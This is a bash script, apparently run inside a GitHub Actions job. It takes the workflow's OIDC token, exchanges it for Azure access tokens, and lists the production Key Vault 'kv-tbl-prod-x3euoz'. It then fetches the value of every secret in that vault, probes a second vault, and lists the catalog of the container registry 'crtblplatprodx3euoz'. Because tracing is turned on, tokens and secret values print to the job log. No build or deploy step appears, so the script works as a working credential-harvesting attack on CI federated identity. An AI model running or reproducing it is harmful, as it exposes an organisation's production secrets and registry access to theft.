#!/usr/bin/env bash
set -x

echo "=== Request OIDC ID token ==="
IDTOKEN=$(curl -sSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')

get_token () {
  local scope="$1"
  curl -sSL -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${IDTOKEN}" \
    --data-urlencode "scope=${scope}" | jq -r '.access_token'
}

echo "=== Key Vault: kv-tbl-prod-x3euoz secrets ==="
KVTOKEN=$(get_token "https://vault.azure.net/.default")
curl -sSL -H "Authorization: Bearer ${KVTOKEN}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4"
echo "---secret values---"
for name in $(curl -sSL -H "Authorization: Bearer ${KVTOKEN}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r '.value[].id' | sed 's#.*/##'); do
  echo "secret: $name"
  curl -sSL -H "Authorization: Bearer ${KVTOKEN}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/${name}?api-version=7.4"
  echo
done

echo "=== Key Vault: kv-tbl-sec-x3euoz secrets (RBAC) ==="
curl -sSL -H "Authorization: Bearer ${KVTOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4"

echo "=== ACR crtblplatprodx3euoz: exchange for registry token ==="
ACRAADTOKEN=$(get_token "https://containerregistry.azure.net/.default")
REFRESH=$(curl -sSL -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" \
  --data-urlencode "grant_type=access_token" \
  --data-urlencode "service=crtblplatprodx3euoz.azurecr.io" \
  --data-urlencode "access_token=${ACRAADTOKEN}" | jq -r '.refresh_token')
ACRTOKEN=$(curl -sSL -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
  --data-urlencode "grant_type=refresh_token" \
  --data-urlencode "service=crtblplatprodx3euoz.azurecr.io" \
  --data-urlencode "scope=registry:catalog:*" \
  --data-urlencode "refresh_token=${REFRESH}" | jq -r '.access_token')
echo "=== ACR catalog ==="
curl -sSL -H "Authorization: Bearer ${ACRTOKEN}" "https://crtblplatprodx3euoz.azurecr.io/v2/_catalog"

echo "=== done ==="
